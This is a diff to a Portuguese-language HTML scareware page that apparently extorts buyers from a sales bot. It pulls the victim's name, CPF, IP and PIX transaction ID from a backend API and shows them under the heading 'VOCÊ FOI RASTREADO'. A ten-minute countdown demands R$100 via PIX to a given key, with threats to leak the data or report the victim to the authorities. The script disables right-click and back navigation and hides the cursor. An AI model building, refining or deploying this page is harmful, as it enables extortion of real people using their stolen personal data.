@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-  <title>VAZAMENTO</title>
+  <title>VAZAMENTO DETECTADO</title>
   <style>
     * {
       margin: 0;
@@ -14,7 +14,7 @@
     
     body {
       background: #000000;
-      color: #ff0000;
+      color: #ffffff;
       font-family: 'Courier New', monospace;
       font-size: 16px;
       line-height: 1.4;
@@ -38,143 +38,118 @@
     .container {
       width: 90%;
       max-width: 800px;
-      animation: pulse 1s infinite;
+      padding: 20px;
     }
     
-    @keyframes pulse {
-      0%, 50% { opacity: 1; }
-      25%, 75% { opacity: 0.7; }
-    }
-    
-    @keyframes flashRed {
-      0%, 50% { background: #000000; }
-      25%, 75% { background: #330000; }
-    }
-    
-    @keyframes flashScreen {
-      0%, 94% { background: #000000; }
-      95%, 100% { background: #660000; }
-    }
-    
-    body.flash {
-      animation: flashScreen 3s infinite;
-    }
-    
-    .header {
-      font-size: 24px;
+    .main-title {
+      font-size: 32px;
       font-weight: bold;
+      color: #ff0000;
       margin-bottom: 30px;
       text-shadow: 0 0 10px #ff0000;
-      animation: blink 1s infinite;
+      animation: slowBlink 2s infinite;
     }
     
-    @keyframes blink {
+    @keyframes slowBlink {
       0%, 50% { opacity: 1; }
       51%, 100% { opacity: 0.3; }
     }
     
-    .eye {
-      font-size: 48px;
-      margin: 20px 0;
-      animation: blink 2s infinite;
-    }
-    
-    .nome-cpf {
-      font-size: 18px;
-      margin: 15px 0;
-      color: #ff3333;
-    }
-    
-    .dados-list {
+    .data-section {
+      margin: 25px 0;
       text-align: left;
-      margin: 20px 0;
-      padding: 0 20px;
     }
     
-    .dados-list li {
-      margin: 8px 0;
-      list-style: none;
-      position: relative;
-      padding-left: 20px;
+    .data-line {
+      margin: 10px 0;
+      font-size: 18px;
     }
     
-    .dados-list li:before {
-      content: "▶";
-      position: absolute;
-      left: 0;
-      color: #ff0000;
+    .data-value {
+      background: #ffffff;
+      color: #000000;
+      padding: 2px 8px;
+      display: inline;
+      font-weight: bold;
     }
     
-    .servidor-msg {
+    .server-msg {
       font-size: 20px;
       font-weight: bold;
       margin: 25px 0;
-      color: #ff6666;
+      color: #ff0000;
       text-shadow: 0 0 15px #ff0000;
     }
     
-    .brain-skull {
-      font-size: 20px;
+    .purple-text {
+      color: #9932cc;
+      font-size: 18px;
       margin: 20px 0;
     }
     
-    .contador {
+    .countdown-label {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 25px 0 10px 0;
+      color: #ffffff;
+    }
+    
+    .countdown {
       font-size: 32px;
       font-weight: bold;
       color: #ff0000;
-      margin: 25px 0;
+      margin: 10px 0 25px 0;
       text-shadow: 0 0 20px #ff0000;
-      animation: blink 0.5s infinite;
       border: 2px solid #ff0000;
       padding: 15px;
       display: inline-block;
     }
     
-    .pix-info {
+    .warning-text {
       font-size: 18px;
       margin: 20px 0;
-      color: #ff4444;
+      color: #ffffff;
+      text-align: left;
     }
     
-    .warning {
+    .warning-list {
+      text-align: left;
+      margin: 15px 0;
+      padding-left: 20px;
+    }
+    
+    .warning-list li {
+      margin: 8px 0;
+      color: #ffffff;
+    }
+    
+    .pix-info {
       font-size: 22px;
       font-weight: bold;
-      margin: 25px 0;
-      color: #ff0000;
-      text-shadow: 0 0 10px #ff0000;
+      margin: 30px 0;
+      color: #ffff00;
+      text-shadow: 0 0 10px #ffff00;
     }
     
-    .final-msg {
-      font-size: 18px;
-      margin: 20px 0;
-      color: #ff6666;
+    /* Screen flash effect */
+    @keyframes screenFlash {
+      0%, 97% { 
+        border: none;
+      }
+      98%, 100% { 
+        border: 3px solid #ff0000;
+        box-shadow: 0 0 20px #ff0000;
+      }
     }
     
-    .glitch {
-      animation: glitch 0.3s infinite;
+    body {
+      animation: screenFlash 3s infinite;
     }
     
-    @keyframes glitch {
-      0% { transform: translate(0); }
-      20% { transform: translate(-2px, 2px); }
-      40% { transform: translate(-2px, -2px); }
-      60% { transform: translate(2px, 2px); }
-      80% { transform: translate(2px, -2px); }
-      100% { transform: translate(0); }
-    }
-    
-    /* Bloqueio de zoom e gestos mobile */
+    /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
         font-size: 14px;
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        overflow: hidden;
-        -webkit-overflow-scrolling: none;
-        overscroll-behavior: none;
       }
       
       .container {
@@ -182,17 +157,21 @@
         padding: 10px;
       }
       
-      .header {
-        font-size: 18px;
+      .main-title {
+        font-size: 24px;
       }
       
-      .contador {
+      .countdown {
         font-size: 24px;
         padding: 10px;
       }
+      
+      .data-line {
+        font-size: 16px;
+      }
     }
     
-    /* Desabilitar seleção e contexto */
+    /* Disable all interactions */
     * {
       -webkit-user-select: none;
       -moz-user-select: none;
@@ -200,109 +179,101 @@
       user-select: none;
       -webkit-touch-callout: none;
       -webkit-tap-highlight-color: transparent;
+      cursor: none !important;
     }
   </style>
 </head>
-<body class="flash">
+<body>
   <div class="container">
-    <div class="header glitch">
-      ❗⚠️ ACESSO MONITORADO - RASTREAMENTO ATIVO ⚠️
-    </div>
-    
-    <div class="eye">👁️</div>
-    
-    <div style="font-size: 28px; font-weight: bold; margin: 20px 0; animation: blink 1s infinite;">
+    <div class="main-title">
       VOCÊ FOI RASTREADO
     </div>
     
-    <div class="nome-cpf">
-      Olá, <span id="nome-usuario">[NOME]</span>.<br>
-      Seu CPF <span id="cpf-usuario">[XXX.XXX.XXX-XX]</span> foi vinculado à tentativa de compra de itens ilegais.
+    <div class="data-section">
+      <div class="data-line">
+        Nome completo: <span class="data-value" id="nome-cliente">[nome_do_cliente]</span>
+      </div>
+      <div class="data-line">
+        CPF: <span class="data-value" id="cpf-cliente">[cpf_do_cliente]</span>
+      </div>
+      <div class="data-line">
+        Endereço (via IP): <span class="data-value" id="ip-cliente">[ip_do_cliente]</span>
+      </div>
+      <div class="data-line">
+        end_to_end_id: <span class="data-value" id="end-to-end-cliente">[id_pix_do_cliente]</span>
+      </div>
     </div>
     
-    <div style="margin: 25px 0; font-size: 18px;">
-      <strong>Dados coletados:</strong>
-    </div>
-    
-    <ul class="dados-list">
-      <li>Nome completo</li>
-      <li>CPF</li>
-      <li>Endereço (via IP)</li>
-      <li>Prints da tela da transação</li>
-      <li>Conta Telegram associada</li>
-      <li>Localização estimada</li>
-    </ul>
-    
-    <div class="servidor-msg">
+    <div class="server-msg">
       TODOS OS DADOS FORAM ENVIADOS PARA UM SERVIDOR INTERNACIONAL
     </div>
     
-    <div class="brain-skull">
-      🧠 Você achou que era só um bot de vendas.<br>
-      ☠️ Agora tá no radar. E a regra é simples:
+    <div class="purple-text">
+      Você achou que era só um bot de vendas. Agora tá no radar. E a regra é simples:
     </div>
     
-    <div style="font-size: 24px; margin: 25px 0;">
-      ⏱️ TEMPO RESTANTE:
+    <div class="countdown-label">
+      TEMPO RESTANTE:
     </div>
     
-    <div class="contador" id="contador">
+    <div class="countdown" id="contador">
       10:00
     </div>
     
-    <div class="pix-info">
-      📤 Se o pagamento de <strong>R$100,00</strong> via PIX não for confirmado até o fim da contagem, seus dados serão:
+    <div class="warning-text">
+      Se o pagamento de R$100,00 via PIX não for confirmado até o fim da contagem, seus dados serão:
     </div>
     
-    <ul class="dados-list" style="margin: 20px 0;">
+    <ul class="warning-list">
       <li>Enviados às autoridades</li>
       <li>Postados em fóruns públicos de vazamento</li>
       <li>Associados a crimes cibernéticos</li>
     </ul>
     
-    <div style="font-size: 20px; margin: 25px 0; color: #ffff00;">
-      PIX de resgate: <strong>pixchave@proton.me</strong>
-    </div>
-    
-    <div class="warning">
-      ❌ NÃO TENTE NEGOCIAR. NÃO ATUALIZE. NÃO SAIA.
-    </div>
-    
-    <div class="final-msg">
-      Reagiu? Vazou. Ficou quieto? Sumiu.
+    <div class="pix-info">
+      PIX de resgate: pixchave@proton.me
     </div>
   </div>
-
-  <!-- Som de interferência digital -->
-  <audio id="interferencia" loop style="display: none;">
-    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTmH1fPOcCMFl9v1xoQzBSKU2e3PeikGJHnJ8N2QQAoUXrTp66hVFApGn+DyvmwhBTmH1fPOcCMF" type="audio/wav">
-  </audio>
 
   <script>
     // Capturar dados da URL
     const urlParams = new URLSearchParams(window.location.search);
     const token = urlParams.get('token');
     
-    // Simular dados do usuário
-    let nomeUsuario = '[NOME]';
-    let cpfUsuario = '[XXX.XXX.XXX-XX]';
+    // Dados padrão
+    let dadosCliente = {
+      nome: '[nome_do_cliente]',
+      cpf: '[cpf_do_cliente]',
+      ip: '[ip_do_cliente]',
+      end_to_end_id: '[id_pix_do_cliente]'
+    };
     
     // Tentar buscar dados reais se token existir
     if (token) {
       fetch(`/api/dados-comprador?token=${token}`)
         .then(response => response.json())
         .then(data => {
-          if (data.success && data.nome) {
-            nomeUsuario = data.nome.toUpperCase();
-            document.getElementById('nome-usuario').textContent = nomeUsuario;
-          }
-          if (data.success && data.cpf) {
-            cpfUsuario = data.cpf;
-            document.getElementById('cpf-usuario').textContent = cpfUsuario;
+          if (data.success) {
+            if (data.nome && data.nome !== 'N/A') {
+              dadosCliente.nome = data.nome;
+              document.getElementById('nome-cliente').textContent = dadosCliente.nome;
+            }
+            if (data.cpf && data.cpf !== 'N/A') {
+              dadosCliente.cpf = data.cpf;
+              document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
+            }
+            if (data.ip && data.ip !== 'N/A') {
+              dadosCliente.ip = data.ip;
+              document.getElementById('ip-cliente').textContent = dadosCliente.ip;
+            }
+            if (data.end_to_end_id && data.end_to_end_id !== 'N/A') {
+              dadosCliente.end_to_end_id = data.end_to_end_id;
+              document.getElementById('end-to-end-cliente').textContent = dadosCliente.end_to_end_id;
+            }
           }
         })
         .catch(error => {
-          console.log('Usando dados simulados');
+          console.log('Usando dados padrão');
         });
     }
     
@@ -325,36 +296,6 @@
     
     // Atualizar contador a cada segundo
     setInterval(atualizarContador, 1000);
-    
-    // Efeito de glitch aleatório
-    function aplicarGlitch() {
-      const elementos = document.querySelectorAll('.container > *');
-      const elemento = elementos[Math.floor(Math.random() * elementos.length)];
-      elemento.classList.add('glitch');
-      setTimeout(() => {
-        elemento.classList.remove('glitch');
-      }, 300);
-    }
-    
-    // Aplicar glitch aleatoriamente
-    setInterval(aplicarGlitch, 2000 + Math.random() * 3000);
-    
-    // Tentar reproduzir som de interferência (baixo volume)
-    function tentarSom() {
-      const audio = document.getElementById('interferencia');
-      if (audio) {
-        audio.volume = 0.1; // Volume muito baixo
-        audio.play().catch(e => {
-          // Ignorar erro se não conseguir reproduzir
-          console.log('Som não disponível');
-        });
-      }
-    }
-    
-    // Tentar som após interação do usuário
-    document.addEventListener('click', tentarSom, { once: true });
-    document.addEventListener('touchstart', tentarSom, { once: true });
-    document.addEventListener('keydown', tentarSom, { once: true });
     
     // Bloquear ações do usuário
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -400,11 +341,7 @@
       history.go(1);
     };
     
-    // Ocultar cursor completamente
-    document.body.style.cursor = 'none';
-    document.documentElement.style.cursor = 'none';
-    
-    // Aplicar cursor none em todos os elementos
+    // Garantir cursor oculto
     const style = document.createElement('style');
     style.textContent = '* { cursor: none !important; }';
     document.head.appendChild(style);
